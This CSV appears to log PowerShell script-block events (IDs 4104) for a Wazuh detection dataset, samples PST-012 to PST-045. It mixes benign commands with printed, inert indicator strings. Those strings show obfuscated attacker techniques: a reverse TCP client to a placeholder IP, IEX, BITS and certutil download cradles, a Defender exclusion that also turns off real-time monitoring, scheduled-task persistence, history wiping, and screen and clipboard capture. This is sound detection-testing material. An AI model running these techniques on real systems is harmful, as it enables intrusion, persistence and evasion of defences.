sample_id,declared_sample_id,mapping_status,source_line,channel,provider_name,computer,record_id,time_created_utc,event_id,scriptblock_id,message_number,message_total,dataset_fidelity_status,scriptblock_sha256,scriptblock_text
PST-012,PST-012,mapped,12,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721439,2026-07-17T09:35:34.9685702Z,4104,d6f8741a-d8a4-4a69-baf0-e23a51467a2d,1,1,exact,9eeb7d3945c28bddd3c3a2be53740c56c67a1966be7816967fcddb9531063b86,"$sampleId='PST-012'; Get-LocalGroup -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-013,PST-013,mapped,13,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721445,2026-07-17T09:35:35.3531147Z,4104,bece8900-cfb6-46b0-926e-985a1c6f2df0,1,1,exact,7e09fc701c45e5cff2718f15e53dccb608dc3d6dcd1519c33001105b423eff67,"$sampleId='PST-013'; Test-Path -Path $env:TEMP; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-014,PST-014,mapped,14,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721449,2026-07-17T09:35:35.7006510Z,4104,ae42ea01-e822-4ab0-9378-ada20492737b,1,1,exact,f9c741bf21431ad36e991e1a9b77ea94aa0e55537fb2a3617e950fdd752a5c56,"$sampleId='PST-014'; $encoded='WwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBHAHIAYQBwAGgAaQBjAHMAXQA6ADoARgByAG8AbQBJAG0AYQBnAGUAKAAkAGIAbQBwACkALgBDAG8AcAB5AEYAcgBvAG0AUwBjAHIAZQBlAG4AKAAwACwAMAAsADAALAAwACwAJABiAG0AcAAuAFMAaQB6AGUAKQA='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-015,PST-015,mapped,15,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721465,2026-07-17T09:35:36.0451732Z,4104,3f3e5a2b-8cd9-4bc9-b844-c372f511a15e,1,1,exact,cd0009c0bde2d0294e9a0ae722848b5c31535fc3da5aedd448cd945c19e11ce1,"$sampleId='PST-015'; $indicator='Register-Sc`hedule`dTask -TaskNa`me ''UpdateCheck'' -Ac`tion (New-Scheduled`TaskActi`on -Exec`ute ''powe`rshell.exe'' -Argument ''-NoProfi`le -Encod`edC`ommand VwBy`AGk`AdABlAC0ATwB1AH`QAcAB1AHQAIAAnAFQA`SABFAFMASQBT`AC0ASQBOAEUAUgBU`A`CcA'')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-016,PST-016,mapped,16,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721467,2026-07-17T09:35:36.3716240Z,4104,58b17f1c-9887-4c0e-b298-0306504edf15,1,1,exact,5abbd8d33dea4d8fce0c4c887d8684021982acafc5e06a0b3a75ee70c1575fe1,"$sampleId='PST-016'; Get-Service | Where-Object Status -eq 'Running' | Select-Object -First 5 Name, Status; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-017,PST-017,mapped,17,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721484,2026-07-17T09:35:36.7248312Z,4104,24d1942a-fdee-42b3-869d-56d18d26afe5,1,1,exact,410f721d743dbeb88daf39c4e8ea7e05a1fd0276a1b083789d00746da41566c1,"$sampleId='PST-017'; (Get-ChildItem -Path $env:TEMP -File -ErrorAction SilentlyContinue | Measure-Object).Count; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-018,PST-018,mapped,18,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721489,2026-07-17T09:35:37.1521104Z,4104,2eb3b735-85d6-4f8f-bf69-033e5bb97511,1,1,exact,7cd8a727df91ad26413903126a3b1d2981d7fe86c10121dd25baddb7212a681f,"$sampleId='PST-018'; $encoded='UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAXwBfAFQASABFAFMASQBTAF8ASQBOAEUAUgBUAF8AXwAnACAALQBEAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAAJAB0AHIAdQBlAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-019,PST-019,mapped,19,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721493,2026-07-17T09:35:37.4787806Z,4104,3dfc415a-003c-4904-85a0-ba6b915502f1,1,1,exact,fb98734111da9743f085ad29e8ced4ee2f100906312bd9ed5a3209b6e56fc8ed,"$sampleId='PST-019'; $b = 'VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHQAZQBzAHQAIABvAG4AbAB5ACcA'; [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-020,PST-020,mapped,20,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721508,2026-07-17T09:35:37.8051762Z,4104,31139fba-d1d2-4128-9b37-55661bc8753f,1,1,exact,033b659077c6e514853be28da822e7fbfaf6be927387cdf0a4676c66abc21cf1,"$sampleId='PST-020'; $parts=@('$CMD=(''','Inv''+''o','Ke-ExP','R`ESSi','on''); &',' (get','-COmm`AND $C','Md) ""Wr','iTe-oU','`tPut ''Th`eSIs','-iner','T''""'); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-021,PST-021,mapped,21,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721522,2026-07-17T09:35:38.1483462Z,4104,a14fded2-e11e-4daf-aa4a-00c86bcf26f6,1,1,exact,81ff657111f1fe81d58bc7bec23118f7424b415662bc3a8a05273205d31d1792,"$sampleId='PST-021'; $p = ('C:' + '\ProgramData' + '\Reports' + '\inventory.json'); Write-Output $p; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-022,PST-022,mapped,22,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721525,2026-07-17T09:35:38.4884920Z,4104,229e971e-1600-4e59-8417-b328179f4a97,1,1,exact,e96fd9a9b8b791112c9493639f47f9df0493ded51c686ac1232f1d23ab639486,"$sampleId='PST-022'; $indicator='Get-Clipboa`rd -Raw | ConvertTo-Json -Comp`ress'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-023,PST-023,mapped,23,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721551,2026-07-17T09:35:40.1121031Z,4104,848c7b5e-53eb-4d43-a616-89ee84ec3766,1,1,exact,9d817959cc944d1eaa773f0055bf6528ef75bc36f1fee3f8316ecf4c8ec1a096,"$sampleId='PST-023'; $indicator='$client=New-Object System.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stream=$client.GetStream(); $buffer=New-Object byte[] 4096; $read=$stream.Read($buffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-024,PST-024,mapped,24,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721555,2026-07-17T09:35:40.4372079Z,4104,d7e2011a-2c71-4944-940b-21cfb54c0ca8,1,1,exact,70c74ecee5401877a4b235c3684aef4e220b13503fc03c1e9d69a5ef7911cddd,"$sampleId='PST-024'; $indicator='Invoke-Command -ComputerName ''host.example.invalid'' -ScriptBlock { powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQASABFAFMASQBTAC0ASQBOAEUAUgBUACcA }'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-025,PST-025,mapped,25,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721559,2026-07-17T09:35:40.7597082Z,4104,27618776-c7b5-45e7-b9bd-c9e8db38cb52,1,1,exact,e902d63517337d940bfe21ad59d0fbf643d1d69e091f2f18b113242eeede49ae,"$sampleId='PST-025'; $parts=@('sTArt-BI`ts','t`raN','SFER -s','OUrcE ''hTt','pS://BITS','.eXaMpLe.','iNV`aL','Id/paYl`OaD','.bIn'' -d','ESTInAtIOn ''','$Env:TEmp\C','aChe.b','iN'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-026,PST-026,mapped,26,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721561,2026-07-17T09:35:41.0934889Z,4104,2677efa9-c6a5-4fab-a7bb-687e13244cde,1,1,exact,499dbcc3b40ccd05b41d55afaed5a8d3567cfbfe29d88d73cd4caf2fa6e55131,"$sampleId='PST-026'; $indicator='In`voke-WebR`equest -Uri ''https://files.exa`mple.inva`lid/up`date.bin'' -OutFile ''$env:TEMP\upda`te.bin'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-027,PST-027,mapped,27,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721575,2026-07-17T09:35:41.6374961Z,4104,d5a3778d-7dc5-44cf-8b17-d1f8d77a1aab,1,1,exact,0080ad119a5b83baf9d4c90db9ced7f7493969bd2b16fa82634ea87277da31a3,"$sampleId='PST-027'; $indicator='$x=New-Object -ComObject MsXml2.ServerXmlHttp; $x.Open(''GET'',''https://xml.example.invalid/task'',$false); $x.Send(); IEX $x.ResponseText'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-028,PST-028,mapped,28,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721578,2026-07-17T09:35:41.9673155Z,4104,b2af3d56-d619-4505-8bf4-abb02b346f02,1,1,exact,08ad340e13a2b8b96eb9a4e09b0b3fddb3722aaf163dcc42d985e3775a150e87,"$sampleId='PST-028'; $parts=@('certutil.exe -ur','lcache -spli','t -f https://cert','.example.inval','id/blob.txt C:\__T','HESIS_INERT__\','blob.txt; c','ertutil.exe -deco','de C:\__THESIS_IN','ERT__\blob.txt C:','\__THESIS_INER','T__\stage.bin'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-029,PST-029,mapped,29,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721582,2026-07-17T09:35:42.2883001Z,4104,ad0bb236-3bb9-4262-bbe8-04a3c58d0df0,1,1,exact,a1d773735dec1cf912c99c38985f628c25a034d3cb03dbdfa600cef067957750,"$sampleId='PST-029'; Get-ChildItem Cert:\CurrentUser\My -ErrorAction SilentlyContinue | Select-Object -First 3 Subject, NotAfter; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-030,PST-030,mapped,30,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721603,2026-07-17T09:35:43.7415141Z,4104,e2d4c628-2d2f-4f40-8f77-70a0fa0356c6,1,1,exact,50f14ad0188dac953d5492aa6d47adce8d008f5a6cb30087038223789bb21acf,"$sampleId='PST-030'; $u = [Uri]'https://intranet.example.local/monitoring/check?id=42'; Write-Output $u.Host; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-031,PST-031,mapped,31,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721606,2026-07-17T09:35:44.0699119Z,4104,d3821113-3a8e-4085-b7f9-db0a2480cb9e,1,1,exact,e7e6b475d9afa41ffaf6bc344e4df62ed3833fd7dd8078ecacef45af8f216b2a,"$sampleId='PST-031'; Get-Acl -Path $env:TEMP | Select-Object Owner, AccessToString; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-032,PST-032,mapped,32,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721610,2026-07-17T09:35:44.4765974Z,4104,b69af7de-4f75-44a6-bf3f-6c627e02931c,1,1,exact,3b71cb351656c251d8c4b1ebdd0167b2371bde75a92fef41736e5e85aca1d93f,"$sampleId='PST-032'; $indicator='add-TYpe -MEMBeRDeFInitiOn ''[dlLIMPort(""kerNEl32.dLL"")] PuBLIc StaTIC EXtern intpTR openPRoCEsS(UINT accesS, bool INHerIt, INT PRoCEssiD);'' -NAMe naTivEMeTHoDs -NamespaCe ThESis.inErT'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-033,PST-033,mapped,33,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721613,2026-07-17T09:35:44.8214637Z,4104,d7d73619-688c-42b4-a39e-9a4d2ba02d63,1,1,exact,64307291dcd6e8edfa04812350fbe1a6466fde2c30f4c72197b5a5c917d2422a,"$sampleId='PST-033'; Get-Process `
| Select-Object -First 3 Name, Id; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-034,PST-034,mapped,34,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721628,2026-07-17T09:35:45.1895315Z,4104,165c591b-9f0a-4394-bd41-f1dd51faff97,1,1,exact,20e42e7ef16d86318ca28f33995c19746dfd912259bcdd75df03bae577eb0c38,"$sampleId='PST-034'; $encoded='cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIAAtAEUAbgBjAG8AZABlAGQAQwBvAG0AbQBhAG4AZAAgAFYAdwBCAHkAQQBHAGsAQQBkAEEAQgBsAEEAQwAwAEEAVAB3AEIAMQBBAEgAUQBBAGMAQQBCADEAQQBIAFEAQQBJAEEAQQBuAEEARgBRAEEAUwBBAEIARgBBAEYATQBBAFMAUQBCAFQAQQBDADAAQQBTAFEAQgBPAEEARQBVAEEAVQBnAEIAVQBBAEMAYwBBAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-035,PST-035,mapped,35,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721629,2026-07-17T09:35:45.5219487Z,4104,c0638034-0b91-4112-bce0-b7ae8f8de743,1,1,exact,8a2f499913d144e1d9ff1a944758a8a60e9d2f1913b31384e4bce185df8afb56,"$sampleId='PST-035'; $indicator='[sYStem.DRaWinG.GRAphics]::fromiMAGe($bmP).cOPyfrOMSCreEN(0,0,0,0,$BMp.sIZE)'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-036,PST-036,mapped,36,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721632,2026-07-17T09:35:45.8648787Z,4104,5a236cb3-1f8d-45e9-9c3c-509db340a32c,1,1,exact,65ef02606d2f93fefe385d75df6f7a3a6ac939fde3335733a7966341a343dddf,"$sampleId='PST-036'; [xml]'<config><mode>audit</mode></config>' | Select-Object -ExpandProperty config; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-037,PST-037,mapped,37,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721637,2026-07-17T09:35:46.1986760Z,4104,e66c52bb-4670-4d7a-aaa4-71377fabbb98,1,1,exact,a495412cb97b399167f790555bc2ff54d1637e5cd3a3c55ee8227ab842d59e92,"$sampleId='PST-037'; 'alpha','gamma','beta' | Sort-Object; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-038,PST-038,mapped,38,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721639,2026-07-17T09:35:46.5242609Z,4104,f42d7fc0-5231-4b4d-aa1a-e967124be132,1,1,exact,69804545dcb180a2213a3bcbe1199c8e88c86ec737c3fb8ff15f1a03b715ade5,"$sampleId='PST-038'; $parts=@('[Reflectio','n.Assemb','ly]:',':Loa','d([Con','vert]::Fr','omBase','64Stri','ng(''VEhFU0lTL','UlORVJULU','RVTU1Z''))'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-039,PST-039,mapped,39,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721641,2026-07-17T09:35:46.8588207Z,4104,aa06255f-e554-4b7d-ae8b-621ec4c605ab,1,1,exact,76338a9f7fc5e96f0a0c6eaeeeb9ac993dbb7edf14b3a1b3cde838919be83ef4,"$sampleId='PST-039'; $parts=@('Invoke-Command -','ComputerName ''host','.example.invali','d'' -ScriptB','lock { power','shell.exe -NoProf','ile -EncodedCo','mmand VwByAGkAd','ABlAC0ATwB1AH','QAcAB1AHQAIAAnAFQASA','BFAFMASQBTAC0AS','QBOAEUAUgBUACcA }'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-040,PST-040,mapped,40,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721645,2026-07-17T09:35:47.1866915Z,4104,84fb42e5-ed6e-4982-a23b-a48debfa5728,1,1,exact,20762758782a29e796e28934a218da9aa0f62a0c10c170c34acb8e7c06d505d4,"$sampleId='PST-040'; $indicator='Get-Process | Select-Object Name,Id,Path'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-041,PST-041,mapped,41,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721648,2026-07-17T09:35:47.5085329Z,4104,def90ffa-49ee-4be4-b7d1-31fea05407b9,1,1,exact,991b75c7add2e324bfa114d9d34c93b6c7abf828b073b6f078b392a382a4a7a9,"$sampleId='PST-041'; $indicator='Clear-History; Remove-Item (Get-PSReadLineOption).HistorySavePath -Force'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-042,PST-042,mapped,42,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721661,2026-07-17T09:35:47.8399836Z,4104,a831476d-1b6c-4c75-bda9-375d3a84e6f7,1,1,exact,ed0a6e979e62a15558f96eaa1b22918789aaf60a884cffd0833972eaa4c315a6,"$sampleId='PST-042'; Write-Output $PROFILE; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-043,PST-043,mapped,43,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721665,2026-07-17T09:35:48.1660973Z,4104,ef087561-3749-45ec-9d6d-ac9f4015054f,1,1,exact,697765f83435ff7daf24ffd9795121cfd0ee4a8b77a30ddf6382b12b4380feb0,"$sampleId='PST-043'; $parts=@('Add-Type -Memb','erDefinition ''[D','llImport(""kernel','32.dll"")] public s','tatic extern',' IntPtr OpenPr','ocess(uint acc','ess, bool inher','it, int process','Id);'' -Name Nativ','eMethods -Namespace',' Thesis.Inert'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-044,PST-044,mapped,44,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721669,2026-07-17T09:35:48.4930944Z,4104,bc69ef68-296d-4a74-9325-4a850b4f96c9,1,1,exact,c74df5f3f45cc1968952dd4c8ded9ae6e9b0cc06a2f546abc6bd5ca93fdb7484,"$sampleId='PST-044'; Get-FileHash -InputStream ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes('benign'))) | Select-Object Algorithm, Hash; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-045,PST-045,mapped,45,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,721671,2026-07-17T09:35:48.8282841Z,4104,7e3828f8-b9dc-4a43-9f91-8d124bc7d25b,1,1,exact,719ce4efea5c76bfc9b16526f5572de82a88bda8df1ba1aacc0ed9826988a563,"$sampleId='PST-045'; $parts=@('Register-ScheduledTas','k -TaskName ''U','pdateCheck'' -Action',' (New-ScheduledTaskAc','tion -Execute ''pow','ershell.exe'' -Argum','ent ''-NoProfile -Enc','odedCommand VwByAGk','AdABlAC0ATwB1AHQAcA','B1AHQAIAAnAFQASAB','FAFMASQBTAC0ASQBO','AEUAUgBUACcA'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
